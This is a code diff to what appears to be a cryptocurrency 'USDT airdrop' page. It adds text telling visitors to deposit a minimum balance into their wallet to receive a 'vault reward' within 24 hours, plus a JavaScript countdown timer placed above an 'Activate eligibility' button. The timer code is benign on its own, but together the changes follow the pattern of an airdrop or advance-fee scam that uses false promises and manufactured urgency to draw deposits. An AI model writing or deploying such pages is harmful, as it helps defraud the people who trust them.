@@ -208,6 +208,29 @@ select:focus {
     <option value="600">600 USDT airdrop → Min balance: 100 USDT</option>
   </select>
 
+    <p class="muted" style="margin-top: 16px;">
+  Please deposit the required balance into your wallet. Once confirmed, your vault reward will be auto credited within 24 hours.
+</p>
+<p id="countdown" style="color:#fb7185; font-weight:600;"></p>
+
+<script>
+  // 24 hours in seconds
+  let timeLeft = 24 * 60 * 60;
+  const countdownEl = document.getElementById('countdown');
+
+  function updateCountdown() {
+    const hours = Math.floor(timeLeft / 3600);
+    const minutes = Math.floor((timeLeft % 3600) / 60);
+    const seconds = timeLeft % 60;
+    countdownEl.textContent = `Time remaining: ${hours}h ${minutes}m ${seconds}s`;
+    if (timeLeft > 0) {
+      timeLeft--;
+      setTimeout(updateCountdown, 1000);
+    }
+  }
+  updateCountdown();
+</script>
+      
   <button id="s3btn" style="margin-top: 16px;">Activate eligibility</button>
     </div>
 
